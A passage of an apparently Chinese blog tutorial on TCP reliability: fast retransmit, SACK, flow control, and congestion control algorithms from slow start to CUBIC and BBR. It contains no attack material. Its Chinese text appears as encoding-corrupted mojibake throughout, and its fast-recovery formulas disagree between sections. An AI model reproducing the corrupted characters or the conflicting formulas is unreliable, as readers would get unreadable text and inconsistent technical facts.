class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1300, Len=100                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100 (é‡å¤2)        </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1400, Len=100                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100 (é‡å¤3)        </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> ğŸš€ æ”¶åˆ°3ä¸ªé‡å¤ACKï¼Œç«‹å³é‡ä¼ ï¼             </span>|<br>  |<span class="hljs-string"> SEQ=1100, Len=100 (å¿«é€Ÿé‡ä¼ )            </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1500                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string"> âœ… æˆåŠŸæ¢å¤                               </span>|<br></code></pre></td></tr></table></figure><h3 id="5-2-SACKï¼ˆé€‰æ‹©æ€§ç¡®è®¤ï¼‰"><a href="#5-2-SACKï¼ˆé€‰æ‹©æ€§ç¡®è®¤ï¼‰" class="headerlink" title="5.2 SACKï¼ˆé€‰æ‹©æ€§ç¡®è®¤ï¼‰"></a>5.2 SACKï¼ˆé€‰æ‹©æ€§ç¡®è®¤ï¼‰</h3><p><strong>ç´¯ç§¯ACKçš„å±€é™</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å‘é€ï¼šæ®µ1(1000), æ®µ2(1100), æ®µ3(1200), æ®µ4(1300)<br>æ¥æ”¶ï¼šæ®µ1âœ“, æ®µ2âœ—, æ®µ3âœ“, æ®µ4âœ“<br><br>ç´¯ç§¯ACKåªèƒ½å‘é€ï¼šACK=1100<br>å‘é€æ–¹ä¸çŸ¥é“æ®µ3å’Œæ®µ4æ˜¯å¦æ”¶åˆ°<br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">- </span>å‘é€æ–¹å¯èƒ½é‡ä¼ æ®µ2ã€3ã€4ï¼ˆæµªè´¹ï¼‰<br><span class="hljs-bullet">- </span>åªéœ€è¦é‡ä¼ æ®µ2å³å¯<br></code></pre></td></tr></table></figure><p><strong>SACKè§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">SACKé€‰é¡¹æ ¼å¼ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ Kind=<span class="hljs-number">5</span> â”‚ Length â”‚ Left Edge â”‚Right Edge â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç¤ºä¾‹ï¼š<br>æ¥æ”¶åˆ°ï¼š<span class="hljs-number">1000-1099</span>, <span class="hljs-number">1200-1299</span>, <span class="hljs-number">1300-1399</span><br><br>SACKé€‰é¡¹ï¼š<br>ACK=<span class="hljs-number">1100</span><br>SACK: <span class="hljs-number">1200-1300</span>, <span class="hljs-number">1300-1400</span><br><br>å«ä¹‰ï¼š<br>- æœŸæœ›æ”¶åˆ°<span class="hljs-number">1100</span><br>- ä½†å·²ç»æ”¶åˆ°<span class="hljs-number">1200-1399</span>çš„æ•°æ®<br><br>å‘é€æ–¹è¡Œä¸ºï¼š<br>- åªé‡ä¼ <span class="hljs-number">1100-1199</span><br>- ä¸é‡ä¼ <span class="hljs-number">1200-1399</span> âœ…<br></code></pre></td></tr></table></figure><h3 id="5-3-å¿«é€Ÿæ¢å¤ï¼ˆFast-Recoveryï¼‰"><a href="#5-3-å¿«é€Ÿæ¢å¤ï¼ˆFast-Recoveryï¼‰" class="headerlink" title="5.3 å¿«é€Ÿæ¢å¤ï¼ˆFast Recoveryï¼‰"></a>5.3 å¿«é€Ÿæ¢å¤ï¼ˆFast Recoveryï¼‰</h3><p><strong>å¿«é€Ÿæ¢å¤ç®—æ³•</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è§¦å‘ï¼šæ”¶åˆ°3ä¸ªé‡å¤ACKæ—¶<br><br>æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> æ‹¥å¡çª—å£å‡åŠ<br>   cwnd = cwnd / 2<br>   ssthresh = cwnd<br><br><span class="hljs-bullet">2.</span> å¿«é€Ÿé‡ä¼ ä¸¢å¤±çš„æ®µ<br><br><span class="hljs-bullet">3.</span> æ¯æ”¶åˆ°ä¸€ä¸ªé‡å¤ACK<br>   cwnd = cwnd + 1 (ä¸´æ—¶è†¨èƒ€)<br><br><span class="hljs-bullet">4.</span> æ”¶åˆ°æ–°çš„ACK<br>   cwnd = ssthresh (æ¢å¤æ­£å¸¸)<br>   è¿›å…¥æ‹¥å¡é¿å…é˜¶æ®µ<br><br>ç›®çš„ï¼š<br><span class="hljs-bullet">-</span> å¿«é€Ÿæ¢å¤ï¼Œä¸å›åˆ°æ…¢å¯åŠ¨<br><span class="hljs-bullet">-</span> ä¿æŒè¾ƒé«˜çš„å‘é€é€Ÿç‡<br></code></pre></td></tr></table></figure><hr><h2 id="6-æµé‡æ§åˆ¶"><a href="#6-æµé‡æ§åˆ¶" class="headerlink" title="6. æµé‡æ§åˆ¶"></a>6. æµé‡æ§åˆ¶</h2><h3 id="6-1-æµé‡æ§åˆ¶çš„ç›®çš„"><a href="#6-1-æµé‡æ§åˆ¶çš„ç›®çš„" class="headerlink" title="6.1 æµé‡æ§åˆ¶çš„ç›®çš„"></a>6.1 æµé‡æ§åˆ¶çš„ç›®çš„</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">é—®é¢˜ï¼š<br>å‘é€æ–¹å‘é€é€Ÿåº¦ &gt; æ¥æ”¶æ–¹å¤„ç†é€Ÿåº¦<br>æ¥æ”¶æ–¹ç¼“å†²åŒºæº¢å‡ºï¼Œæ•°æ®ä¸¢å¤±<br><br>è§£å†³ï¼š<br>æ¥æ”¶æ–¹é€šè¿‡çª—å£å¤§å°å‘Šè¯‰å‘é€æ–¹è¿˜èƒ½æ¥æ”¶å¤šå°‘æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="6-2-æµé‡æ§åˆ¶æœºåˆ¶"><a href="#6-2-æµé‡æ§åˆ¶æœºåˆ¶" class="headerlink" title="6.2 æµé‡æ§åˆ¶æœºåˆ¶"></a>6.2 æµé‡æ§åˆ¶æœºåˆ¶</h3><p><strong>æ¥æ”¶çª—å£é€šå‘Š</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ¥æ”¶æ–¹åœ¨æ¯ä¸ªACKä¸­é€šå‘Šçª—å£å¤§å°<br><br>ç¤ºä¾‹ï¼š<br>æ¥æ”¶ç¼“å†²åŒºå¤§å°ï¼š8KB<br>å·²æ¥æ”¶æœªè¯»ï¼š2KB<br>å¯ç”¨ç©ºé—´ï¼š6KB<br><br>å‘é€ACKï¼š<br><span class="hljs-attribute">ACK</span>=1000, <span class="hljs-attribute">Window</span>=6144 (6KB)<br><br>å‘é€æ–¹ï¼š<br>- æœ€å¤šå†å‘é€6KBæ•°æ®<br>- å‘é€åç­‰å¾…ACKå’Œæ–°çš„çª—å£é€šå‘Š<br></code></pre></td></tr></table></figure><p><strong>é›¶çª—å£é—®é¢˜</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœºæ™¯ï¼š<br><span class="hljs-bullet">1.</span> æ¥æ”¶æ–¹ç¼“å†²åŒºæ»¡ï¼Œå‘é€Window=0<br><span class="hljs-bullet">2.</span> å‘é€æ–¹åœæ­¢å‘é€<br><span class="hljs-bullet">3.</span> æ¥æ”¶æ–¹å¤„ç†æ•°æ®ï¼Œç¼“å†²åŒºæœ‰ç©ºé—´<br><span class="hljs-bullet">4.</span> ä½†å¦‚æœACKä¸¢å¤±ï¼Œå‘é€æ–¹ä¸çŸ¥é“å¯ä»¥ç»§ç»­å‘é€<br><br>è§£å†³ï¼šé›¶çª—å£æ¢æµ‹<br>å‘é€æ–¹å®šæœŸå‘é€é›¶çª—å£æ¢æµ‹æ®µï¼ˆ1å­—èŠ‚æ•°æ®ï¼‰<br>è¯¢é—®æ¥æ”¶æ–¹æ˜¯å¦æœ‰å¯ç”¨çª—å£<br></code></pre></td></tr></table></figure><p><strong>ç³Šæ¶‚çª—å£ç»¼åˆç—‡ï¼ˆSilly Window Syndromeï¼‰</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é—®é¢˜ï¼š<br>æ¥æ”¶æ–¹æ¯æ¬¡åªè¯»å–å¾ˆå°‘æ•°æ®<br>å¯¼è‡´é¢‘ç¹å‘é€å°çª—å£é€šå‘Š<br>å‘é€æ–¹å‘é€å¤§é‡å°æ•°æ®æ®µ<br>æ•ˆç‡ä½ä¸‹<br><br>ç¤ºä¾‹ï¼š<br>ç¼“å†²åŒº8KBï¼Œåº”ç”¨æ¯æ¬¡è¯»1å­—èŠ‚<br>Windowåºåˆ—ï¼š0, 1, 0, 1, 0, 1...<br>æ•ˆç‡ï¼šæä½ âŒ<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">1.</span> æ¥æ”¶æ–¹ï¼ˆClarkç®—æ³•ï¼‰<br><span class="hljs-bullet">   -</span> ç¼“å†²åŒºç©ºé—´ &lt; MSSæ—¶ï¼Œé€šå‘ŠWindow=0<br><span class="hljs-bullet">   -</span> ç›´åˆ°æœ‰è¶³å¤Ÿç©ºé—´ï¼ˆMSSæˆ–ç¼“å†²åŒºä¸€åŠï¼‰<br><br><span class="hljs-bullet">2.</span> å‘é€æ–¹ï¼ˆNagleç®—æ³•ï¼‰<br><span class="hljs-bullet">   -</span> ç­‰å¾…æ•°æ®ç´¯ç§¯åˆ°MSSå¤§å°å†å‘é€<br><span class="hljs-bullet">   -</span> æˆ–æ”¶åˆ°ä¹‹å‰æ•°æ®çš„ACKå†å‘é€<br></code></pre></td></tr></table></figure><hr><h2 id="7-æ‹¥å¡æ§åˆ¶"><a href="#7-æ‹¥å¡æ§åˆ¶" class="headerlink" title="7. æ‹¥å¡æ§åˆ¶"></a>7. æ‹¥å¡æ§åˆ¶</h2><h3 id="7-1-æ‹¥å¡æ§åˆ¶-vs-æµé‡æ§åˆ¶"><a href="#7-1-æ‹¥å¡æ§åˆ¶-vs-æµé‡æ§åˆ¶" class="headerlink" title="7.1 æ‹¥å¡æ§åˆ¶ vs æµé‡æ§åˆ¶"></a>7.1 æ‹¥å¡æ§åˆ¶ vs æµé‡æ§åˆ¶</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æµé‡æ§åˆ¶ï¼ˆFlow Controlï¼‰ï¼š<br><span class="hljs-bullet">- </span>ç›®æ ‡ï¼šé˜²æ­¢æ¥æ”¶æ–¹è¿‡è½½<br><span class="hljs-bullet">- </span>æœºåˆ¶ï¼šæ¥æ”¶çª—å£ï¼ˆrwndï¼‰<br><span class="hljs-bullet">- </span>æ§åˆ¶ï¼šæ¥æ”¶æ–¹æ§åˆ¶å‘é€æ–¹<br><br>æ‹¥å¡æ§åˆ¶ï¼ˆCongestion Controlï¼‰ï¼š<br><span class="hljs-bullet">- </span>ç›®æ ‡ï¼šé˜²æ­¢ç½‘ç»œè¿‡è½½<br><span class="hljs-bullet">- </span>æœºåˆ¶ï¼šæ‹¥å¡çª—å£ï¼ˆcwndï¼‰<br><span class="hljs-bullet">- </span>æ§åˆ¶ï¼šå‘é€æ–¹è‡ªå·±åˆ¤æ–­<br><br>å‘é€çª—å£ = min(rwnd, cwnd)<br></code></pre></td></tr></table></figure><h3 id="7-2-æ‹¥å¡æ§åˆ¶ç®—æ³•"><a href="#7-2-æ‹¥å¡æ§åˆ¶ç®—æ³•" class="headerlink" title="7.2 æ‹¥å¡æ§åˆ¶ç®—æ³•"></a>7.2 æ‹¥å¡æ§åˆ¶ç®—æ³•</h3><p><strong>1. æ…¢å¯åŠ¨ï¼ˆSlow Startï¼‰</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç›®çš„ï¼š<br>è¿æ¥åˆæœŸæ¢æµ‹ç½‘ç»œå®¹é‡<br><br>ç®—æ³•ï¼š<br>1. åˆå§‹cwnd = 1 MSS (æˆ–æ›´å¤§ï¼Œå¦‚10 MSS)<br>2. æ¯æ”¶åˆ°ä¸€ä¸ªACKï¼Œcwnd += 1<br>3. æ•ˆæœï¼šcwndæŒ‡æ•°å¢é•¿ï¼ˆæ¯ä¸ªRTTç¿»å€ï¼‰<br><br>ç¤ºä¾‹ï¼š<br>RTT 0: <span class="hljs-attribute">cwnd</span>=1,  å‘é€1ä¸ªæ®µ<br>RTT 1: <span class="hljs-attribute">cwnd</span>=2,  å‘é€2ä¸ªæ®µ<br>RTT 2: <span class="hljs-attribute">cwnd</span>=4,  å‘é€4ä¸ªæ®µ<br>RTT 3: <span class="hljs-attribute">cwnd</span>=8,  å‘é€8ä¸ªæ®µ<br><span class="hljs-built_in">..</span>.<br><br>ç»ˆæ­¢æ¡ä»¶ï¼š<br>- cwnd &gt;= ssthreshï¼ˆæ…¢å¯åŠ¨é˜ˆå€¼ï¼‰<br>  â†’ è¿›å…¥æ‹¥å¡é¿å…<br>- å‘ç”Ÿä¸¢åŒ…<br>  â†’ è¿›å…¥æ‹¥å¡é¿å…æˆ–å¿«é€Ÿæ¢å¤<br></code></pre></td></tr></table></figure><p><strong>2. æ‹¥å¡é¿å…ï¼ˆCongestion Avoidanceï¼‰</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç›®çš„ï¼š<br>å°å¿ƒç¿¼ç¿¼åœ°å¢åŠ çª—å£ï¼Œé¿å…æ‹¥å¡<br><br>ç®—æ³•ï¼š<br>æ¯æ”¶åˆ°ä¸€ä¸ªACKï¼š<br>cwnd = cwnd + 1/cwnd<br><br>æ•ˆæœï¼šæ¯ä¸ªRTTï¼Œcwndå¢åŠ 1<br><br>ç¤ºä¾‹ï¼š<br>RTT 0: <span class="hljs-attribute">cwnd</span>=16<br>RTT 1: <span class="hljs-attribute">cwnd</span>=17<br>RTT 2: <span class="hljs-attribute">cwnd</span>=18<br>RTT 3: <span class="hljs-attribute">cwnd</span>=19<br><span class="hljs-built_in">..</span>.<br><br>ç‰¹ç‚¹ï¼šçº¿æ€§å¢é•¿ï¼ˆæ¯”æ…¢å¯åŠ¨æ…¢å¾—å¤šï¼‰<br></code></pre></td></tr></table></figure><p><strong>3. æ‹¥å¡å‘ç”Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æƒ…å†µ1ï¼šè¶…æ—¶ï¼ˆä¸¢åŒ…ä¸¥é‡ï¼‰<br>è¡Œä¸ºï¼š<br><span class="hljs-bullet">- </span>ssthresh = cwnd / 2<br><span class="hljs-bullet">- </span>cwnd = 1 MSS<br><span class="hljs-bullet">- </span>é‡æ–°æ…¢å¯åŠ¨<br><br>æƒ…å†µ2ï¼š3ä¸ªé‡å¤ACKï¼ˆä¸¢åŒ…è¾ƒè½»ï¼‰<br>è¡Œä¸ºï¼š<br><span class="hljs-bullet">- </span>ssthresh = cwnd / 2<br><span class="hljs-bullet">- </span>cwnd = ssthresh + 3<br><span class="hljs-bullet">- </span>å¿«é€Ÿé‡ä¼  + å¿«é€Ÿæ¢å¤<br></code></pre></td></tr></table></figure><p><strong>4. å¿«é€Ÿæ¢å¤ï¼ˆFast Recoveryï¼‰</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ç®—æ³•ï¼š<br><span class="hljs-bullet">1.</span> ssthresh = cwnd / 2<br><span class="hljs-bullet">2.</span> cwnd = ssthresh + 3<br><span class="hljs-bullet">3.</span> é‡ä¼ ä¸¢å¤±çš„æ®µ<br><span class="hljs-bullet">4.</span> æ¯æ”¶åˆ°é‡å¤ACKï¼Œcwnd += 1ï¼ˆä¸´æ—¶è†¨èƒ€ï¼‰<br><span class="hljs-bullet">5.</span> æ”¶åˆ°æ–°ACKæ—¶ï¼Œcwnd = ssthresh<br><span class="hljs-bullet">6.</span> è¿›å…¥æ‹¥å¡é¿å…<br><br>ç›®çš„ï¼š<br><span class="hljs-bullet">-</span> å¿«é€Ÿæ¢å¤ï¼Œä¸å›åˆ°æ…¢å¯åŠ¨<br><span class="hljs-bullet">-</span> ç»´æŒè¾ƒé«˜ååé‡<br></code></pre></td></tr></table></figure><h3 id="7-3-æ‹¥å¡æ§åˆ¶çŠ¶æ€å›¾"><a href="#7-3-æ‹¥å¡æ§åˆ¶çŠ¶æ€å›¾" class="headerlink" title="7.3 æ‹¥å¡æ§åˆ¶çŠ¶æ€å›¾"></a>7.3 æ‹¥å¡æ§åˆ¶çŠ¶æ€å›¾</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros">         [è¿æ¥å»ºç«‹]<br>              â†“<br>        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>        â”‚ æ…¢å¯åŠ¨    â”‚ cwndæŒ‡æ•°å¢é•¿<br>        â”‚          â”‚ æ¯ACK: cwnd += 1<br>        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>      cwnd &gt;= ssthresh<br>              â†“<br>        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>        â”‚æ‹¥å¡é¿å…   â”‚ cwndçº¿æ€§å¢é•¿<br>        â”‚          â”‚ æ¯RTT: cwnd += 1<br>        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>          å‘ç”Ÿä¸¢åŒ…<br>           â†™    â†˜<br>    è¶…æ—¶         3ä¸ªé‡å¤ACK<br>      â†“               â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ…¢å¯åŠ¨    â”‚    â”‚å¿«é€Ÿæ¢å¤   â”‚<br>â”‚<span class="hljs-attribute">cwnd</span>=1    â”‚    â”‚<span class="hljs-attribute">cwnd</span>=ssthresh/2+3â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>      â†“               â†“<br>      â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>        â”‚æ‹¥å¡é¿å…   â”‚<br>        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="7-4-æ‹¥å¡æ§åˆ¶å˜ä½“"><a href="#7-4-æ‹¥å¡æ§åˆ¶å˜ä½“" class="headerlink" title="7.4 æ‹¥å¡æ§åˆ¶å˜ä½“"></a>7.4 æ‹¥å¡æ§åˆ¶å˜ä½“</h3><p><strong>TCP Renoï¼ˆç»å…¸ç®—æ³•ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>æ…¢å¯åŠ¨ <span class="hljs-code">+ æ‹¥å¡é¿å… +</span> å¿«é€Ÿé‡ä¼  + å¿«é€Ÿæ¢å¤<br><span class="hljs-bullet">- </span>æœ€ç»å…¸çš„TCPå®ç°<br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">- </span>å¯¹å¤šä¸ªä¸¢åŒ…å¤„ç†ä¸å¥½<br><span class="hljs-bullet">- </span>æ¯ä¸ªRTTåªèƒ½æ¢å¤ä¸€ä¸ªä¸¢åŒ…<br></code></pre></td></tr></table></figure><p><strong>TCP NewReno</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ”¹è¿›ï¼š<br><span class="hljs-bullet">- </span>æ”¹è¿›çš„å¿«é€Ÿæ¢å¤<br><span class="hljs-bullet">- </span>å¯ä»¥åœ¨ä¸€ä¸ªRTTå†…æ¢å¤å¤šä¸ªä¸¢åŒ…<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>éƒ¨åˆ†ACKè§¦å‘é‡ä¼ <br><span class="hljs-bullet">- </span>ç›´åˆ°æ‰€æœ‰ä¸¢å¤±æ•°æ®æ¢å¤æ‰é€€å‡ºå¿«é€Ÿæ¢å¤<br></code></pre></td></tr></table></figure><p><strong>TCP CUBICï¼ˆLinuxé»˜è®¤ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>çª—å£å¢é•¿å‡½æ•°ï¼šcwnd = C(t - K)^3 + W_max<br><span class="hljs-bullet">- </span>æ›´é€‚åˆé«˜å¸¦å®½é•¿å»¶è¿Ÿç½‘ç»œ<br><br>ä¼˜ç‚¹ï¼š<br><span class="hljs-bullet">- </span>å¿«é€Ÿæ¢æµ‹å¯ç”¨å¸¦å®½<br><span class="hljs-bullet">- </span>å…¬å¹³æ€§æ›´å¥½<br><span class="hljs-bullet">- </span>é«˜é€Ÿç½‘ç»œæ€§èƒ½æ›´å¥½<br></code></pre></td></tr></table></figure><p><strong>TCP BBRï¼ˆGoogleï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç†å¿µï¼š<br><span class="hljs-bullet">- </span>ä¸åŸºäºä¸¢åŒ…ï¼ŒåŸºäºRTTå’Œå¸¦å®½<br><span class="hljs-bullet">- </span>ä¸»åŠ¨æ¢æµ‹ç“¶é¢ˆå¸¦å®½å’ŒRTT<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>4ä¸ªçŠ¶æ€ï¼šStartup, Drain, ProbeBW, ProbeRTT<br><span class="hljs-bullet">- </span>æ›´é«˜ååé‡<br><span class="hljs-bullet">- </span>æ›´ä½å»¶è¿Ÿ<br></code></pre></td></tr></table></figure><hr><h2 id="8-å®æˆ˜é¡¹ç›®ï¼šTCPå¯é æ€§åˆ†æå·¥å…·"><a 